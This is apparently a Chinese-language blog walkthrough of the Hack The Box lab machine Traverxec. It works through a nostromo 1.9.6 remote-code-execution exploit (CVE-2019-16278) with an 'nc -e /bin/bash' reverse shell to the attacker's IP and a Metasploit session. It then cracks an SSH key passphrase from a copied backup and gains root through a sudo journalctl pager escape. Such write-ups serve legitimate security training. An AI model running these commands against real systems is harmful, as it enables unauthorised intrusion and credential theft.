---
layout:     encrypted
title:      "Hackthebox Traverxec writeup/Walkthrough/攻略"
subtitle:   "CVE-2019-16278/ssh2jhon/GTFO bin’s"
date:       2020-01-03 00:28:00
author:     "WuJ"
header-img: "img/post-bg-htb-traverxec.jpg"
tags:
    - HTB
    - 渗透测试
catalog: true
---

## 0x00 简介

- CVE-2019-16278  nostromo
- 爆破
- gtfobin’s

## 0x01 信息收集

1. 首先使用 nmap 扫描目标靶机

```shell
root@kali:~# nmap -A 10.10.10.165
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-02 22:25 CST
Nmap scan report for 10.10.10.165
Host is up (0.54s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (89%), Linux 3.16 (88%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Android 4.1.1 (85%), Android 4.1.2 (85%), Linux 3.10 - 4.11 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   363.39 ms 10.10.14.1
2   363.49 ms 10.10.10.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 461.24 seconds

```

> nmap -A (进攻性扫描模式选项)
>
> 这个选项启用额外的高级和高强度选项，目前还未完全确定具体的内容。目前，这个选项集成了操作系统检测(-O) 和版本扫描(-sV)，以后会增加更多的功能。 目的是启用一个全面的扫描选项集合，而不需要用户记忆大量的选项。这个选项仅仅启用功能，不包含用于可能所需要的 时间选项(如-T4)或细节选项(-v)。

目标靶机开放了 22 和 80 端口，注意到其中 80 端口使用了 **nostromo 1.9.6** 服务

2. 访问 web 服务查看是否存在有用信息

![image-20200102224439846](https://tva1.sinaimg.cn/large/006tNbRwgy1gailmzeunpj31qk0u04ju.jpg)

```bash
root@kali:~# dirsearch -u "10.10.10.165" -e *

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions:  | Threads: 10 | Wordlist size: 6083

Error Log: /root/dirsearch/logs/errors-20-01-02_22-46-54.log

Target: 10.10.10.165

[22:46:58] Starting: 
[22:47:04] 400 -  302B  - /%2e%2e/google.com
[22:47:04] 501 -  310B  - /%20../
[22:47:10] 200 -   15KB - /
[22:48:05] 200 -   15KB - /%3f/
[22:52:37] 501 -  310B  - /admin%20/
[22:56:49] 301 -  314B  - /css  ->  http://10.10.10.165/css/
[22:58:48] 301 -  314B  - /icons  ->  http://10.10.10.165/icons/
[22:58:58] 301 -  314B  - /img  ->  http://10.10.10.165/img/
[22:59:11] 200 -   15KB - /index.html
[22:59:30] 301 -  314B  - /js  ->  http://10.10.10.165/js/
[22:59:44] 301 -  314B  - /lib  ->  http://10.10.10.165/lib/
[23:01:26] 501 -  310B  - /New%20Folder
[23:01:26] 501 -  310B  - /New%20folder%20%282%29
[23:03:34] 200 -  203B  - /Readme.txt

```

查看源码、扫描目录后均未发现特别有意义的信息，倒是知道了网站的所有者叫 David

## 0x02 Getshell

nostromo nhttpd 存在版本漏洞，可以远程执行命令，这里可以有两种办法 getshell

### 方法一：手工利用

下载公开 exploits，[CVE-2019-16278](https://github.com/jas502n/CVE-2019-16278) 

利用方式：

```bash
./CVE-2019-16278.sh 'ip' 'port' 'cmd'
```

在本机监听 4444 端口，利用 exp 反弹 bash 回 kali 攻击机，获得靶机 shell

```shell
root@kali:~/CVE/CVE-2019-16278# ./CVE-2019-16278.sh 10.10.10.165 80 nc -e /bin/bash 10.10.15.44 4444

root@kali:~/CVE/CVE-2019-16278# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.44] from (UNKNOWN) [10.10.10.165] 54462
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

此时获取的并不是一个具有完整功能的 bash，为了获取一个交互式的 tty 我们可以利用以下命令（第一个成功率最高）：

```python
1. python -c 'import pty; pty.spawn("/bin/sh")'
2. echo os.system('/bin/bash')
3. /bin/sh -i
```

**Tips:** 之后为了得到一个更好的用的 shell 可以按 **Ctrl + z** 挂起任务，之后输入 **stty raw -echo** .  然后输入 **fg** 将任务回到前台，这样我们就可以在 shell 中使用上下键回到上一条命令并利用 tab 补全命令。

```shell
python -c 'import pty;pty.spawn("/bin/bash")';
www-data@traverxec:/usr/bin$ ^Z
[1]+  已停止               nc -lvnp 4444
root@kali:~/CVE/CVE-2019-16278# stty raw -echo 
root@kali:~/CVE/CVE-2019-16278# nc -lvnp 4444
                                             pwd
/usr/bin
www-data@traverxec:/usr/bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 反弹 shell 的一些技术文章
>
> [Linux反弹shell（一）文件描述符与重定向](https://xz.aliyun.com/t/2548)
>
> [Linux 反弹shell（二）反弹shell的本质](https://xz.aliyun.com/t/2549#toc-5)
>
> [linux各种一句话反弹shell总结](https://www.anquanke.com/post/id/87017)

### 方法二：msf 自动化利用

更新 msf

```shell
$ apt update
$ apt install metasploit-framework
```

搜索漏洞并利用：

```sh
root@kali:~# msfconsole
[-] ***rting the Metasploit Framework console.../
[-] * WARNING: No database support: could not connect to server: Connection refused
	Is the server running on host "localhost" (::1) and accepting
	TCP/IP connections on port 5432?
could not connect to server: Connection refused
	Is the server running on host "localhost" (127.0.0.1) and accepting
	TCP/IP connections on port 5432?

[-] ***
                                                  
     ,           ,
    /             \
   ((__--,,,--__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.66-dev                          ]
+ -- --=[ 1956 exploits - 1092 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


msf5 > use exploit/multi/http/nostromo_code_exec 
msf5 exploit(multi/http/nostromo_code_exec) > show options 

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
  
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  --
   0   Automatic (Unix In-Memory)


msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.15.44
LHOST => 10.10.15.44
msf5 exploit(multi/http/nostromo_code_exec) > set RHOST 10.10.10.165
RHOST => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > exploit 

[*] Started reverse TCP handler on 10.10.15.44:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.15.44:4444 -> 10.10.10.165:57788) at 2020-01-02 23:28:33 +0800
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
shell
[*] Trying to find binary(python) on target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
$ pwd
pwd
/usr/bin
```

## 0x03 User.txt

我们以 www-data 的低权限进入了靶机

在 /home 目录下发现疑似 user 的文件夹，但没有权限读取其目录

```shell
www-data@traverxec:/usr/bin$ cd /home
www-data@traverxec:/home$ ls
david
www-data@traverxec:/home$ cd david
www-data@traverxec:/home/david$ ls
ls: cannot open directory '.': Permission denied
www-data@traverxec:/home/david$ 
```

这时候可以去找配置文件和证书文件等，我们在 **/var/nostromo/conf** 目录下发现了 nostromo 的配置文件

```shell
www-data@traverxec:/home/david$ cd /var/nostromo/conf/
www-data@traverxec:/var/nostromo/conf$ ls
mimes  nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

发现在 /home 目录下存在 public_www 的文件夹，但之前查看 /home 的目录时没有找到，猜想 public_www 存在 david 文件下，尝试 cd 进去

```shell
www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls
index.html  protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area/
www-data@traverxec:/home/david/public_www/protected-file-area$ ls backup-ssh-identity-files.tgz
```

其中有 ssh 密钥的备份文件压缩包 backup-ssh-identity-files.tgz, 可以通过 base64 将其拷贝到本地 kali

```shell
$ base64 backup-ssh-identity-files.tgz                       
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
```

之后用 `base64 -d` 在本地还原 .tgz

```shell
root@kali:~# echo "H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uem
> gKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4
> mG+ZxykaPj4+fZ2Df/Peb/X/j1J+o380T2U73I8s/bnO9vG7xPgiMIFhv6o/AePf6E9AxEt/6LtE
> /w3+4vq/NP88jNEH84JFzSPi4D1BhC+3PGMz7JfHjM2N/jAadgJdSVjy/NeVew4UGQkXbu02dzPh
> 6hzE7jwt5h64paBUQcd5I85rZXhHBnNuFCo8CTsocnTcPbm7OkUttG1KrEJIcpKJHkYjRhzchYAl
> 5rjjTeZjeoUIYKeUKaqyYuAo9kqTHEEYZ/Tq9ZuWNNLALUFTqotmrGRzcRQw8V1LZoRmvUIn84Yc
> rKakVOI4+iaJu4HRXcWH1sh4hfTIU5ZHKWjxIjo1BhV0YXTh3TCUWr5IerpwJh5mCVNtdTlybjJ2
> r53ZXvRbVaPNjecjp1oJY3s6k15TJWQY5Em5s0HyGrHE9tFJuIG3BiQuZbTa2WSSsJaEWHX1NhN9
> noI66mX+4+ua+ts0REs2bFkC/An6f+v/e/rzazl83xhfPf7r+z+KYsQ//Y/iL/9jMIS//f9H8PkL
> rCAp5odzYT4sR/EYV/jQhOBrD2ANbfLZ3bvspw/sB8HknMByBR7gBe2z0uTtTx+McPkMI9RnjuV+
> wEhSEESRZXBCpHmEQnkUo1/68jgPURwmAsCY7ZkM5pkE0+7jGhnpIocaiPT5TnXrmg70WJD4hpVW
> p6pUEM3lrR04E9Mt1TutOScB03xnrTzcT6FVP/T63GRKUbTDrNeedMNqjMDhbs3qsKlGl1IMA62a
> VDcvTl1tnOujN0A7brQnWnN1scNGNmi1bAmVOlO6ezxOIyFVViduVYswA9JYa9XmqZ1VFpudydpf
> efEKOOq1S0Zm6mQm9iNVoXVx9ymltKl8cM9nfWaN53wR1vKgNa9akfqus/quXU7j1aVBjwRk2ZNv
> GBmAgicWg+BrM3S2qEGcgqtun8iabPKYzGWl0FSQsIMwI+gBYnzhPC0YdigJEMBnQxp2u8M575gS
> Ttb3C0hLo8NCKeROjz5AdL8+wc0cWPsequXeFAIZW3Q1dqfytc+krtN7vdtY5KFQ0q653kkzCwZ6
> ktebbV5OatEvF5sO+CpUVvHBUNWmWrQ8zreb70KhCRDdMwgTcDBrTnggD7BV40hl0coCYel2tGCP
> qz5DVNU+pPQW8iYe+4iAFEeacFaK92dgW48mIqoRqY2U2xTH9IShWS4Sq7AXaATPjd/JjepWxlD3
> xWDduExncmgTLLeop/4OAzaiGGpf3mi9vo4YNZ4OEsmY8kE1kZAXzSmP7SduGCG4ESw3bxfzxoh9
> M1eYw+hV2hDAHSGLbHTqbWsuRojzT9s3hkFh51lXiUIuqmGOuC4tcXkWZCG/vkbHahurDGpmC465
> QH5kzORQg6fKD25u8eo5E+V96qWx2mVRBcuLGEzxGeeeoQOVxu0BH56NcrFZVtlrVhkgPorLcaip
> FsQST097rqEH6iS1VxYeXwiG6LC43HOnXeZ3Jz5d8TpC9eRRuPBwPiFjC8z8ncj9fWFY/5RhAvZY
> 1bBlJ7kGzd54JbMspqfUPNde7KZigtS36aApT6T31qSQmVIApga1c9ORj0NuHIhMl5QnYOeQ6ydK
> DosbDNdsi2QVw6lUdlFiyK9blGcUvBAPwjGoEaA5dhC6k64xDKIOGm4hEDv04mzlN38RJ+esB1kn
> 0ZlsipmJzcY4uyCOP+K8wS8YDF6BQVqhaQuUxntmugM56hklYxQso4sy7ElUU3p4iBfras5rLybx
> 5lC2Kva9vpWRcUxzBGDPcz8wmSRaFsVfigB1uUfrGJB8B41Dtq5KMm2yhzhxcAYJl5fz4xQiRDP5
> 1jEzhXMFQEo6ihUnhNc0R25hTn0Qpf4wByp8N/mdGQRmPmmLF5bBI6jKiy7mLbI76XmW2CfN+IBq
> mVm0rRDvU9dVihl7v0I1RmcWK2ZCYZe0KSRBVnCt/JijvovyLdiQBDe6AG6cgjoBPnvEukh3ibGF
> d+Y2jFh8u/ZMm/q5cCXEcCHTMZrciH6sMoRFFYj3mxCr8zoz8w3XS6A8O0y4xPKsbNzRZH3vVBds
> Mp0nVIv0rOC3OtfgTH8VToU/eXl+JhaeR5+Ja+pwZ885cLEgqV9sOL2z980ytld9cr8/naK4ronU
> pOjDYVkbMcz1NuG0M9zREGPuUJfHsEa6y9kAKjiysZfjPJ+a2baPreUGga1d1TG35A7mL4R9SuII
> FBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm
> 6Zqg5SFeLGgaD67A12wlmPwvZ7E/O8v+9/LL9d+P3Rx/vxj/0fmPwL7Uf19+F7zrvz+A9/nvr33+
> e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==" | base64 -d > sshbackup.tgz
```

解压 sshbackup.tgz，发现 david 的 ssh 密钥

```shell
root@kali:~# tar -zxvf sshbackup.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

使用 ssh2john 对 passphrase 进行爆破

```shell
root@kali:~/home/david/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@kali:~/home/david/.ssh# ssh2john id_rsa > davidhash
root@kali:~/home/david/.ssh# ls
authorized_keys  davidhash  id_rsa  id_rsa.pub
root@kali:~/home/david/.ssh# cat davidhash 
id_rsa:$ssh2$2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c34373745454646424135364639443238334433343930333344354430384334460a0a73657965482f6665473139546c55614d6476485a4b2f32716679387077776472397367373578346850704a4a3859617568576f72434e344c504a562b776643470a7475694250665a792b5a506b6c4c6b4f6e654967676f72754c6b564757346b343635317077656b5a6e6a735438494d4d336a6e644c4e53526b6a7843545833570a4b7a5739564650756a53515a6e484d394a686f364a384f384c547a6c2b7336476a507046786a6f324172326e50776a6f666451656a5042654f376b58774446550a524a5570637341747048416258614a49394c46795838496851386672544f4f4c75424d6d75534577687a394b566a77326b694c424c794b532b735554392f56370a48485648573437592f455646677245584b75304f503872467459554c512b376b376e666237664849674b4a2f3651595a65363972304158454f747634347a49630a59314f4d47727951703543567a746343484c79532f394773524230643054746c7159324c586b2b316e75595079795a4a68796e6745376250396a73702b6865630a645452715671546e50377a493847794b54562b4b4e6741306d375557514e532b4a67717653513959446a5a4977466c41386a784a503948737557575854305a4e0a36706d595a632f724e6b43456c326c2f6f4a62614a42336a502f3147577a6f2f71354a5841366a6a79726439785a444e356258324532677a646343506435714f0a78777a6e61366a73326b4d64437849524e5645726e7653474249425330732f4f6e5870486e4a546a4d726b716772505743654c41663078455054676b747169310a5132494d4a716857394c6b55733438732b7a37326541686c386e614566676e2b6662516d354d4d5a2f783642437578534e574146716e756a3452414c6a646e360a693237676573526b78786e534d5a35446d51584d7272494275754c4a366748676a72756143706468354875454845665546716e624a6f624a41334e65763534540a667a654174523872564a486c43756f356a6d75366869747147736a7948464a2f6853465974624f35436d5a5230684d576c317a56513343624e686a65497746410a627a67537a7a4a644b59624744397479664b337a3352636b566867564467454d465242354871432b7948447952622b55356b61334c636c675431724f2b32736f0a75446936665879764142582b653445346c774a5a6f4274486b2f4e714d76445465623974644e4f6b566254644663326b57747a3938564639796f4e38327538490a416b2f4b4f6e70376c7a486e523037647664443631527a486b6d3337727654597255657861484a343538644854333672665578616665383176366c36524d38730a3943427245702b4c4b4141324a724b35503230427271467550665758764674524f4c596570473965484e46654e34754d7375542f35356c62666e355334312f550a72477730747859496e566d654c5230524a4f333762332f68615349727963616b384c5a7a465350554e757771466362785238514a4671714c7868614d7a7475610a346d4f717241654746505038445367593354436c6f524d3048692f4d7a485055496374784856325262594f2f36544448667a2b5a32366e7458507a75416752550a2f38477a67773536457948446154674e7471596164587275594a31694e447941724541752b4b76565a68596c596a68534c46666f327952644f7547426d3941580a4a504e65617877304458385577476241517955306b3439655042466545675168394e4563596567436f486c7561717061667859783263354d7059316e5267382b0a58427a624c463970634d785a69415772733462575571416f645866455536465a7637647361745461396c77483034616a2f35717845624a757775417557354c680a684f52415a766248754978437a6e657171526a5334744e526d306b4639754935576b664b31654c4d4f336758745666664f36764444336d63544e4c31705175660a53503047717651316469426978504d782b596b69696d526767557763476e64336c52424251324d4e7757743539527269335a34416930706662314b3754764f4d0a6a3161513462516d56583875426f7162507657302f6f516a6b624376665234587636512b6362612f466e474e5a78684852386a6348383056614e5334363974740a5665596e6946552f54476e524b44594c51483278306e693174426630774b4f4c45525930436247446371757a526f576a416d544e2f5056325662454b4b442f770a2d2d2d2d2d454e44205253412050524956415445204b45592d2d2d2d2d0a*1766*0
root@kali:~/home/david/.ssh# john --wordlist=/usr/share/wordlists/rockyou.txt davidhash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
```

获得 ssh 登录密码 `hunter`

使用 ssh 登录获得 user 权限，读取 user.txt

```shell
root@kali:~# ssh -i ./home/david/.ssh/id_rsa david@traverxec.htb
ssh: Could not resolve hostname traverxec.htb: Name or service not known
root@kali:~# ssh -i ./home/david/.ssh/id_rsa david@10.10.10.165
Enter passphrase for key './home/david/.ssh/id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Thu Jan  2 10:55:21 2020 from 10.10.14.47
david@traverxec:~$ ls
bin  public_www  user.txt
```

## 0x04 root.txt

当进行提权时，注意到的第一件事是 david 的主目录中有一个 bin 目录，该目录中有一个名为 server-stats.sh 的文件。

```shell
david@traverxec:/bin$ cd
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh  try.sh
david@traverxec:~/bin$ ./server-stats.sh 
                                                                          .--.
                                                              ._________. | == |
   Webserver Statistics and Data                              |.-"""""-.| |--|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |--|
                                                              |'-.....-'| |::::|
                                                              '"")--(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

Load:  11:15:23 up  1:00,  3 users,  load average: 0.11, 0.04, 0.01
 
Open nhttpd sockets: 18
Files in the docroot: 117
 
Last 5 journal log lines:
-- Logs begin at Thu 2020-01-02 10:14:54 EST, end at Thu 2020-01-02 11:15:23 EST. --
Jan 02 11:14:48 traverxec sudo[2762]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/12 ruser=www-data rhost=  user=www-data
Jan 02 11:14:50 traverxec sudo[2762]: pam_unix(sudo:auth): conversation failed
Jan 02 11:14:50 traverxec sudo[2762]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Jan 02 11:14:50 traverxec sudo[2762]: www-data : command not allowed ; TTY=pts/12 ; PWD=/dev/shm ; USER=root ; COMMAND=list
Jan 02 11:14:51 traverxec crontab[2855]: (www-data) LIST (www-data)
```

journalctl 是一个收集服务日志的服务

```shell
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash
cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

发现  /usr/bin/journalctl 是作为 root 运行的，这一点很重要。

查看  [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/)，发现通过 sudo 运行的 journalctl 可以被利用来提权。

> **GTFObins:** Gtfo这款工具采用Python3开发，在Gtfo的帮助下，广大研究人员可以直接在命令行终端窗口中搜索 GTFOBins(Linux) 和 LOLBAS(Win) 代码文件。
>
> 该工具的主要功能就是帮助研究人员直在命令行终端窗口中搜索 GTFOBins 和 LOLBAS 代码文件。除此之外，它还可以让研究人员专注于命令行串钩，而无需面对明亮的白色背景的桌面窗口，它可以帮助我们将vim、反向Shell和其他漏洞利用“合为一体”。
>
> [如何在Windows和Linux上搜索可利用的二进制文件或exe文件](https://www.freebuf.com/sectool/214286.html)

![image-20200103100856286](https://tva1.sinaimg.cn/large/006tNbRwgy1gaj5evah4wj31e00u07bg.jpg)

注意到 `journalctl` 的提权利用方式和 `less` 一样，因此必须想办法触发 `pager` ，一个简单的办法就是把终端窗口尽可能调小。之后执行 `!/bin/sh`，获得 root 权限。

<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/006tNbRwgy1gaj5opf7nlj31c00u0b29.jpg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">当窗口较大则无法触发</div> </center>
<center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/006tNbRwgy1gaj60bu62rj31460u0qdv.jpg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">当窗口较小则可以提权</div> </center>
```shell
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Thu 2020-01-02 10:14:54 EST, end at Thu 2020-01-02 11:21:37 EST
Jan 02 11:14:48 traverxec sudo[2762]: pam_unix(sudo:auth): authentication failur
Jan 02 11:14:50 traverxec sudo[2762]: pam_unix(sudo:auth): conversation failed
Jan 02 11:14:50 traverxec sudo[2762]: pam_unix(sudo:auth): auth could not identi
Jan 02 11:14:50 traverxec sudo[2762]: www-data : command not allowed ; TTY=pts/1
Jan 02 11:14:51 traverxec crontab[2855]: (www-data) LIST (www-data)
!/bin/sh
# ls
server-stats.head  server-stats.sh  try.sh
# cd
# whoami
root
# ls
